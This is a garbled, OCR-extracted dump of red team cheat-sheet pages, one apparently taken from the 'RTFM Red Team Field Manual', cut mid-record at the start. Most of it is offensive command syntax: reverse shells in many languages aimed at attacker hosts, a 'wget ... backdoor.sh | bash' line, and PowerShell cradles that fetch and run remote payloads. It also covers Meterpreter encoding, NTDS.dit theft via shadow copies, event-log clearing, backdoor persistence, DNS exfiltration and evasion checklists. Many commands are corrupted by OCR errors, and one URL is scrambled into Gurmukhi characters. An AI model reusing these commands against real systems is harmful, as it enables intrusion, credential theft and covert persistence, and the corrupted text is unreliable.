urlopen(\"http://{}:{}\".format(ip, opts.port))\nprint(\"%s : %s\" % (header,headers[header].get('server')))\nsr(IPv6(src=\"<IP_ADDRESS>\", dst=\"<IP_ADDRESS>\")/ICMP())\npacket=IP(src=\"<IP_ADDRESS>\", dst=\"<IP_ADDRESS>\")/UDP(dport=\nSYN = ip/TCP(sport=RandNum(6000,7000),dport=80,flags=\"S\",seq=4)\nACK = ip/TCP(sport=SYNACK.dport, dport=80, flags=\"A\",\nfor(my $port=<START_PORT>;$port<<END_PORT>;$port++)\nmy $remote=IO::Socket::INET->new( Proto=>\"tcp\",PeerAddr=>\"\nStart listener on attack box to catch reverse shells\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc\nsocket(S,PF_INET, SOCK_STREAM,getprotobyname(\"tcp\"));\nIO::Socket::INET(PeerAddr,\"<IP_ADDRESS>:<PORT>\");STDIN-\npython -c \u2018import socket,subprocess,os; s=socket.socket(socket.AF_INET,\nsocket.SOCK_STREAM); s.connect((\"<IP_ADDRESS>\",<PORT>));\nos.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/<IP_ADDRESS>/<PORT>;cat <&5 | while read line; do\nphp -r '$sock=fsockopen(\"<IP_ADDRESS>\",<PORT>);exec(\"/bin/sh -i <&3 >&3 2>&3\");\u2018\nruby -rsocket -e'f=TCPSocket.open(\"<IP_ADDRESS>\",<PORT>).to_i; exec sprintf(\"/bin/sh -i\nruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"<IP_ADDRESS>\",\"\n<PORT>\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n<PORT>\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\ntelnet <IP_ADDRESS> <PORT> | /bin/bash | telnet <IP_ADDRESS> <PORT+1>\nwget -O- http://<IP_ADDRESS>:<PORT>/backdoor.sh | bash\n\u0a08\u0a14\u0a14\u0a10\u0a13://\u0a10\u0a05\u0a0e\u0a14\u0a05\u0a13\u0a14\u0a0d\u0a0f\u0a0e\u0a0b\u0a05\u0a19.\u0a0e\u0a05\u0a14/\u0a03\u0a08\u0a05\u0a01\u0a14-\u0a13\u0a08\u0a05\u0a05\u0a14/\u0a13\u0a08\u0a05\u0a0c\u0a0c\u0a13/\u0a12\u0a05\u0a16\u0a05\u0a12\u0a13\u0a05-\u0a13\u0a08\u0a05\u0a0c\u0a0c-\u0a03\u0a08\u0a05\u0a01\u0a14-\u0a13\u0a08\u0a05\u0a05\u0a14\n\u0a08\u0a14\u0a14\u0a10://\u0a02\u0a05\u0a12\u0a0e\u0a01\u0a12\u0a04\u0a0f\u0a04\u0a01\u0a0d\u0a05\u0a0c\u0a05.\u0a02\u0a0c\u0a0f\u0a07\u0a13\u0a10\u0a0f\u0a14.\u0a03\u0a0f\u0a0d/2011/09/\u0a12\u0a05\u0a16\u0a05\u0a12\u0a13\u0a05-\u0a13\u0a08\u0a05\u0a0c\u0a0c\u0a13-\u0a0f\u0a0e\u0a05-\u0a0c\u0a09\u0a0e\u0a05\u0a12\u0a13.\u0a08\u0a14\u0a0d\u0a0c\nMore info at: https://edzeame.wordpress.com/2014/06/23/setting-up-\nThis section outlines various tradecraft considerations that should be made\nDo created artifact names and configurations blend in\nwith the target environment (service names, descriptions,\nIs the artifact uploaded to a non-descript location?\nOnce the persistence executes, is the payload process\nAfter persistence executes, is the implant call back\nIs it normal to see this machine talk to the remote\nDo I hold the correct permission to remotely execute?\nOnce the persistence executes, is the payload process\nShould I remove the artifact after gaining persistence?\nIs the \"domain\" section of the technique set correctly?\nIs the hash or password still valid (it could be expired)?\nDoes the user belong to any concerning groups (HBSS\nHas the user authenticated from this machine before?\nIs an active user credential required for this task?\nRevert all credentials in implant sessions (rev2self,\nExit any implants no longer needed for the operation.\nSleep down all HTTPS implants to a slower call back\ntype, 20, 23, 62, 70, 75, 76, 88, 91, 93, 94, 99, 127"}
{"source": "book", "book": "Books", "file": "rtfm-red-team-field-manual.pdf", "text": "All rights reserved. No part of this work may be reproduced or transmitted\nProduct and company names mentioned herein may be the trademarks of their\nrespective owners. Rather than use a trademark symbol with every occurrence\nfashion, with no intention of infringement of the trademark. Use of a term\nin this book should not be regarded as affecting the validity of any\nwas taken to ensure the accuracy of the material, the author assumes no\nresulting from the use of the information contained herein.\n*NIX ................................................................................................................................................................. 4\nWINDOWS \u2022\u2022\u2022\u2022\u2022..\u2022\u2022.\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022...\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022...\u2022\u2022..\u2022\u2022\u2022\u2022...\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022.\u2022\u2022..\u2022\u2022.\u2022\u2022\u2022.\u2022\u2022\u2022\u2022.\u2022\u2022\u2022.\u2022\u2022...\u2022\u2022\u2022\u2022\u2022..\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022 14\nNETWORKING \u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022...\u2022\u2022...\u2022\u2022..\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022.\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022...\u2022..\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022.\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022 34\nTIPS AND TRICKS ...\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022..\u2022\u2022...\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022...\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022..\u2022\u2022\u2022 42\nTOOL SYNTAX \u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022.\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022 50\nWEB \u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022...\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022...\u2022\u2022..\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022..\u2022\u2022.\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022.\u2022 66\nDATABASES \u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022...\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022.\u2022.\u2022\u2022\u2022\u2022\u2022..\u2022\u2022...\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022..\u2022\u2022.\u2022.\u2022\u2022\u2022\u2022.\u2022...\u2022\u2022.\u2022\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022. 72\nPROGRAMMING ............................................................................................................................................ 76\nWIRELESS ..\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022...\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022...\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022..\u2022\u2022...\u2022\u2022\u2022\u2022.....\u2022\u2022.\u2022\u2022\u2022\u2022.\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022. 84\nREFERENCES \u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022..\u2022\u2022...\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022...\u2022\u2022\u2022\u2022\u2022..\u2022\u2022..\u2022\u2022.\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022 94\nINDEX \u2022\u2022\u2022\u2022...\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022...\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022...\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022..\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022. 95\n'-)'''M\u00abV#ffr'ZW\u00a511i!f--wiiMfM'M'WMi'\"\"f%ffi!I'''IW\"\"liH;:-~@\nfor x in {1 .. 254 .. l};do ping -c 1 l.l.l.$x lgrep \"64 b\" lcut -d\" \"-f4\nfor ip in {1 .. 254 .. 1}; do dig -x l.l.l.$ip I grep $ip\n# This script bans any IP in the /24 subnet for 192.168.1.0 starting at 2\n# It assumes 1 is the router and does not ban IPs .20, .21, .22\n11.1} J A}. J, I A J. 11 A A .1. /.). J. I 1 J.} J.\nI A I I I.) 1 .I A).. A .l. J. J.} .I),).. J.}.}).. J. A A; J, J,. J.ll\nSet up script in crontab to callback ever} X minutes.\nset up a generic user on red team computer (with no shell privs).\nwill use the private kej (located on callback source computer) to connect\nto a public key (on red team computer). Red teamer connects to target via a\nlocal SSH session (in the example below, use #ssh -p4040 localhost)\nCallbac~: script located on callback source computer (target)\n\"/home/$(REMUSR}/.ssh/id rsa\" -N $(LIVEHOST} -1 $(REMUSR}\niptables -t nat -A PREROUTING -p tcp -i ethO -j DNAT -d\niptables -t nat -A POSTROUTING -p tcp -i ethC -j SNAT -s\nALLOW ONLY 1.1.1. 0/24, PORTS 80,443 AND LOG DROPS TO\niptables -A INPU~ -s 1.1.1.0/24 -m state --state RELATED,ESTAB~ISHED,NEW\niptables -A INPUT -i ethO -m state --state RELATED,ESTABLISHED -j ACCEPT\nLOGGING -m limit --limit 4/min -j LOG --log-prefix \"DROPPED \"\n\u2022 Available in Linux distributions such as Red Hat Enterprise Linux (RHEL),\nconvert /tmp/test.xpm -resize 1280x1024 /tmp/test.jpg\nCAPTURE PACKETS ON ETH0 IN ASCII AND HEX AND WRITE TO FILE\ntcpdump -i ethO -tttt dst 192.168.1.22 and not net 192.168.1.0/24\n# Mounts to /mnt/share. For other options besides ntlmssp, man mount.cifs\nuser= user ,pass= pass ,sec=ntlrnssp,domain= domain ,rw\nWindows XP (Home, Pro, MC, Tablet PC, Starter, Embedded)\nWindows Server 2008 (Foundation, Standard, Enterprise)\nWindows Server 2008 R2 (Foundation, Standard, Enterprise)\nWindows Server 2012 (Foundation, Essentials, Standard)\n%SystemDrive%\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n%SystemDrive%\\Users\\%UserName%\\AppData\\Roaming\\Microsoft\\Windows\\Start\n%SystemDrive%\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\n%SystemDrive%\\WINNT\\Profiles\\All Users\\Start Menu\\Programs\\Startup\nnetsh interface portproxy add v4tov4 listenport=3000\nlistenaddress=l.l.l.l connectport=4000 connectaddress=2.2.2.2\nnetsh interface portproxy delete v4tov4 listenport=3000\nreg add HKCU\\Software\\Policies\\t1icrosoft\\Windows\\System /v DisableCHD /t\nEXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS\nHKEY LOCAL t1ACHINE\\SYSTEH\\CurrentControlSet \\Control\\ TerminalService\nreg add \"HKEY LOCAL t1ACHINE\\SYSTEH\\CurentControlSet\\Control \\Terminal\nTUNNEL RDP OUT PORT 443 (MAY NEED TO RESTART TERMINAL SERVICES)\nREG ADD \"HKLt1\\System\\CurrentControlSet\\Control \\Terminal\nServer\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 443 /f\nreg add \"HKEY LOCAL t1ACHINE\\SYSTEt1\\CurentControlSet\\Control \\Terminal\nServer\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d \"0\" /f\nnetsh firewall set service type = remotedesktop mode = enable\nschtasks.exe /create /tn t1yTask /xml \"C:\\l1yTask.xml\" /f\n[alias] == process, share, startup, service, nicconfig, useraccount, etc.\n[where] ==where (name=\"cmd.exe\"), where (parentprocessid!=[pid]\"), etc.\n[clause] ==list [fulllbrief], get [attribl, attrib2], call [method],\nEXECUTE FILE HOSTED OVER SMB ON REMOTE SYSTEM WITH SPECIFIED\nwmic product where name= 11XXX\" call uninstall /nointeractive\nwmic /node:remotecomputer computersystern get username\nwmic /node:\"machinename 4\" path Win32_TerminalServiceSetting where\nAllowTSConnections=''O'' call SetAllowTSConnections ''1''\nwmic netlogin where (name like \"%adm%\") get numberoflogons\nwmic service get narne,displayname,pathnarne,startrnode lfindstr /i nauton\nIf anJ copies alread1 ex~st then exfil, otherwise create using\nfollowing commands. Check output.txt for anJ errors\ncall create \"cmd /c vssadmin create shadow /for=C: 2 &1\n\\\\?\\GLOBALROOT\\Device\\HarddiskVol~meShadowCopy1\\Windows\\System32\\co\n/user: \"DOl'.llUN\\user\" /password: 11 PASS\" process\n\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyc\\NTDS\\NTDS.dit\nStep bj step instructions o~ roorn362.com for step below\nFrom Linux, download and run ntdsxtract and libesedb to export\nAdditional instructions found under the VSSOW~ section\nCLEAR SECURITY & APPLCIATION EVENT LOG FOR REMOTE SERVER(S~Ol)\nClear-EventLog -logname Application, Security -computername SVR01\nGet-WmiObject -class win32 operatingsjstem I select -property\nNew-PSJrive -Persist -PSProvider FileSjstem -Root \\\\1.1.1.1\\tools -Name i\nGet-Childitem -Path c:\\ -Force -Rec~rse -Filter '.log -ErrorAction\nSilentl~Con~inue I where {$ .LastWriteTime -gt ''2012-08-20''}\n(new-object sjstem.net.webclient) .downloadFile(''url'',''dest'')\n$ports=(#,#,#) ;$ip=\"x.x.x.x\";foreach ($port in $ports) {trJ($socket=New-\nobject Sjste~.Net.Sockets.TCPClient($ip,$port); }catch(};if ($socket -eq\n$NULL) (echo $ip\":\"$port\"- Closed\";}else(echo $ip\":\"$port\"- Open\";$socket\n$ping = New-Object Sjstex.Net.Networkinformation.ping\npowershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass\n$Host.UI.PromptForCredential( 11 title \", 11 message\nRUN EXE EVERY 4 HOURS BETWEEN AUG 8-11 , 2 013 AND THE HOURS OF\npowershell. exe -Command \"do {if ((Get-Date -format yyyyl1l1dd-HHmm) -match\n'201308 ( 0 [ 8-9] 11 [0-1])- I 0 [ 8-9] 11 [ o-c]) [ 0-5] [ 0-9]') {Start-Process -\nWindowStyle Hidden \"C:\\Temp\\my.exe\";Start-Sleep -s 14400))while(1)\"\n$pw ~ convertto-securestring -string \"PASSWORD\" -asplaintext -force;\n$pp ~ new-object -typename System.Management.Automation.PSCredential -\nStart-Process powershell -Credential $pp -ArgumentList '-noprofile -command\npowershell.exe Send-l-1ai1Hessage -to \" email \" -from \" email \" -subject\n\"Subject 11 -a \" attachment file path \" -body \"Body\" -SmtpServer\nTURN ON POWERSHELL REMOTING (WITH VALID CREDENTIALS)\nl1icrosoftDNS _ ResourceRecord -Filter \"domainname~' DOl1AIN '\" I select\nPOWERSHELL DOWNLOAD OF A FILE FROM A SPECIFIED LOCATION\n\"[System.Net.ServicePointManager] ::ServerCertificateValidationCallback\n{$true); $source~\"\"\"https:ll YOUR SPECIFIED IP I file.zip \"\"\";\n$destination= 111111C:\\rnaster.zip 111111 ;-$http = new-object Systern.Net.WebClient;\n$response~ $http.DownloadFile($source, $destination);\"\nScript will send a file ($filepath) via http to server ($server) via POST\nMust have web server listening on port designated in the $server\n\"[S;stem.Net.ServicePointManager] ::ServerCertificateValidationCallback\n{$true); $server~\"\"\"http:ll YOUR SPECIFIED IP I folder \"\"\";\n$filepath=\" 1111C:\\rnaster.zip 111111 i $http= new=object System.Net.WebClient;\nNeed Metasploit v4.5+ (msfvenom supports Powershell)\nUse Powershell (x86) with 32 bit Meterpreter payloads\nencodeMeterpreter.psl script can be found on next page\n./msfvenom -p Wlndows/meterpreter/reverse https -f psh -a x86\nMove audit.psl into same folder as encodeMeterpreter.psl\npowershell.exe -executionpolicy bypass encodeMeterpreter.psl\n$action = [IO.Compression.CompressionMode]: :Compress\n$cs =New-Object IO.Compression.DeflateStream ($ms,$action)\n$sw =New-Object IO.StreamWriter ($cs, [Text.Encoding] ::ASCII)\n$command= \"Invoke-Expression '$(New-Object IO.StreamReader('$(New-Object\nIO. Compression. DeflateStream ('$(New-Object IO. t4emoryStream\n(, '$ ( [Convert] : : FromBase64String ('\"$code'\") ) I I ,\n$bytes= [System.Text.Encoding] ::Unicode.GetBytes($command)\n$encodedCommand = [Convert]: :ToBase64String($bytes)\nCopyright 2012 TrustedSec, LLC. All rights reserved.\nUSING POWERSHELL TO LAUNCH METERPRETER (2ND METHOD)\nrnsfpajload windows/rneterpreter/reverse tcp LHOST~10.1.1.1\n$crnd ~ ' PASTE THE CONTENTS OF THE PSH SCRIPT HERE\n$u ~ [Sjstern.Text.Encoding]: :Unicode.GetBytes($crnd)\nON TARGET SHELL ( 1 : DOWNLOAD SHELLCODE, 2 : EXECUTE)\npowershell -noprofile -noninteracti ve -command \" &\nSjstern.Net.WebClient;$client.DownloadFile('http://1.1.1.1/shell.txt\npowershell -noprofile -noninteracti ve -noexi t -command\n{$crnd~tjpe 'c:\\windows\\ternp\\ shell.txt';powershell -noprofile-\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion /v\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion /v InstallDate\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion /v RegisteredOwner\nHKLM\\Software\\~icrosoft\\Windows NT\\CurrentVersion /v SjstemRoot\nHKLM\\Sjstem\\CurrentControlSet\\Control\\TimeZoneinformation /v ActiveTirneBias\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Map Network Drive\nHKEY_LOCAL_~ACHI~E\\SYSTEM\\CurrentControlSet\\Services\\Tcp~p\\Parameters -\nHKCU\\Soft\\v~re \\t1icroso ft \\Windows NT\\CurrentVersion \\Winlogon \\autoadminlogon\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentControlSet\\Services\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\nHKCU\\Software\\Microsoft\\Windows\\Curren~Version\\Explorer\\ComDlg32\\LastVisite\nHKCU\\Software\\Microsoft\\Internet Explorer\\TjpedURLs\nHKCU\\ Software \\:ci erose ft \\Windows\\ Cur rentVer s ion\\ Explorer \\Runt1RU\nHKCU\\Software\\l1icrosoft\\Windows\\CurrentVersion\\Applets\\RegEdit /v LastKeJ\nHKLl1\\Soft'..;are \\t1icroso:t \\ 1/'Jindows \\CurrentVers on \\Run & \\Runonce\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVers on\\Policies\\Explorer\\Run\nHKCU\\Software\\Microsoft\\Windows\\CurrentVers on\\Run & \\Runonce\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load & \\Run\ndsadd user ''CN=Bob,CN=Users,DC=victim,DC=corn'' -samid bob -pwd bobpass-\ndisplaj \"Bob 11 -pwdneverexpires jes -rnemberof \"CI';=Domain\ndsrm -subtree -noprornpt ''CN=Bob,CN=Users,DC=victim,DC=com''\ndsquerJ A ''DC=victim,DC=com'' -scope subtree -attr ''en''\n11 (& (objectclass=computer) (objectcategorJ=computer) (operatingSjstem=Windows}\n\" (& (objectCategory~Computer) (objectClass~Computer) (operatingSystem~'Server'\nJ ''CN=Sites,CN=Configuration,DC=forestRootDomain'' -filter\n) If scripting in batch file, variables must be preceeded with %%, i.e. %%i\nfor /L %i in (10,1,254) do@ (for /L %x in (10,1,254) do@ ping -n 1 -w 100\nfor /F %n in (names.txt) do for /F %pin (pawds.txt) do net use \\\\DC01\\IPC$\nfor /f %%U in (list.txt) do @for /1 %%C in (1,1,5) do @echo net use \\\\WIN-\nin (2,1,254) do (netsh interface ip set address local static\nIT 1 S A DIRECTORY, FILE DATE/TIME, RELATIVE PATH, ACTUAL PATH AND\nforfi1es /P c:\\ternp /s /rn pass' -c \"crnd /c echo @isdir @fdate @ftirne\nfor /L %i in (0,1,100) do (for /F %n in (domains.txt) do nslookup %n\nfor /L %C in (1,1,5000) do @for %U in (www.Jahoo.com www.pastebin.com\nwww.pajpal.com www.craigslist.org www.google.com) do start /b iexplore %U &\nfor /f ''tokens=2 delims='=''' %a in ('wmic service list full lfind /i\ndelims = '' %a in (c:\\windows\\temp\\3afd4ga.tmp) do cmd.exe\nfor /L %i in (2,1,254) do shutdown /r /m \\\\l.l.l.%i /f /t 0 /c \"Reboot\nSHELL ESCALATION USING VBS (NEED ELEVATED CREDENTIALS)\nSet shell ' wscript.createobject(''wscript.shell'')\nC:\\Windows\\SJstem32\\WindowsPowershell\\vl.O\\powershell.exe -WindowStJle\nhidden -NoLogo -~onlnteractive -ep bjpass -nop -c \\'' & '''''''' & ''IEX ((New-\nObject Net.WEbClieil':).down:oadstring(' url '))\\\" & \"\"\"\" & \"\"\"\"\n' Scheduled tasks binary paths CANNOT contain spaces because everjthing\nafter the first space in the path is considered to be a command-line\nargument. Enclose the /TR path parameter between backslash (\\) AND\nTASK SCHEDULER (ST=START TIME, SD=START DATE, ED=END DATE)\n\"C:\\Windows\\sjswow64\\WindowsPowerShell\\vl.O\\powershell.exe\"\n\"C:\\Windows\\System32\\WindowsPowerShell\\vl.O\\powershell.exe -WindowStyle\nhidden -NoLogo -Noninteractive -ep bypass -nap -c 'IEX ((new-object\nnet.webclient) .downloadstring( ''http:// ip : port I payload'''))'\" /SC\n\"C:\\Windows\\System32\\WindowsPowerShell\\vl.O\\powershell.exe -WindowStjle\nhidden -NoLogo -Noninteractive -ep bypass -nap -c 'IEX ((new-object\nnet.webclient) .downloadstring(''http:// ip : port I payload'''))'\" /SC\n\"C:\\Windows\\System32\\WindowsPowerShell\\vl.O\\powershell.exe -WindowStyle\nhidden -NoLogo -Noninteractive -ep bjpass -nop -c 'IEX ((new-object\nnet.webclient) .downloadstring(''http:// ip : port I payload'''))'\" /SC\nsocat TCP-LISTEN:8080,reuseaddr,fork TCP6: [2001: :] :80\nCAPTURE TRAFFIC TO SPECIFIC IP EXCLUDING SPECIFIC SUBNET\n\"$3)==\"Nrnap scan report\")print$5\" \"$6}' I sed 's/(//g' I sed 's/)//g'\nEttercap filter to drop IPSEC traffic IUDP port 5001\nREG KEY TO HAVE PuTTY LOG EVERYTHING (INCLUDING CONVERSATIONS)\n[HKEY_CURRENT_USER\\Software\\Si~onTatham\\Putt;\\Sessions\\Default%20Settings]\nforb in 'cat fole.hex '; do dig $b.shell.evilexample.com; done\ntcdpump -w /tmp/dns -sO port 53 and host sjstem.example.com\nOn attacker (capture pac~ets to data.dmp and parse}:\nNETCAT (* START LISTENER ON ATTACK BOX TO CATCH SHELL)\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/fl/bin/sh -i 2 &line l0.0.0.1 1234\n$i~\"10.0.0.l\"; $p~1234; socket(S,PF INET, SOCK STREAt1,\ngetprotobjname(\"tcp\") I; if(connect(S,sockaddr in($p,inet-aton($i) I iT!\nopen(STDIN,\" &S\") ;open(STDOUT,\" &S\"); open(ST~ERR,\" &8\"17 exec(\"/bin/sh-\nIO: :Socket: :INET(PeerAddr,\"attackerip:4444\") ;STDIN- fdopen($c,r) ;$--\nperl -MIO -e '$c=new IO: :Socket: :INET(PeerAddr,''attackerip:4444'') ;STDIN-\npython -c 'import socket, subprocess, os; s=socket. socket (socket .. ;;F _ INET,\nsocket.SOCK_STREAL1); s.connect( (\"10.0.0.1\",1234)); os.dup2 (s.fileno() ,0);\nphp -r '$sod:~fsockopen(\"10.0.0.1\", 1234) ;exec(\"/bin/sh -i\nruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234) .to i; exec\nfork;c=TCPSocket.new(\"attackerip\",\"4444\");while(crnd=c.gets);IO.popen(cmd,\n'c=TCPSocket.new(\"attacY..erip\",\"4444\");while(crnd=c.gets);IO.popen{cmd,\"r 11 ) {I\nrm -f /tmp/p; mknod /tmp/p p && telnet attacl:erip 4444 0/tmp/p\ntelnet attacl:erip 4444 I /bin/bash I telnet attackerip 4445\nWINDOWS TASK SCHEDULER PERSISTENCE (START TASK SCHEDULER)\nREG add HKEY CURRENT USER\\Software\\l1icrosoft\\Windows\\CurrentVersion\\Run\n/v firewall 7t REG SZ /d \"c:\\windows\\system32\\backdoor.exe\" /f\nat 19:00 /every:t1,T,W,Th,F cmd /c start \"%USERPROFILE%\\backdoor.exe\"\nSCHTASKS /Create /RU \"SYSTEt1\" /SC l1INUTE /t10 45 /TN FIREWALL /TR\nFrom the compromised machine, share the payload folder\nUse psexec or wmic command to remotely execute payload\nUse psexec or wmic command to remotely execute payload\nLISTEN ON 1234 AND FORWARD TO PORT 80 ON 2. 2. 2. 2\nproxjchains nmap -PN -vv -sT -p 22,135,139,445 2.2.2.2\nLISTEN 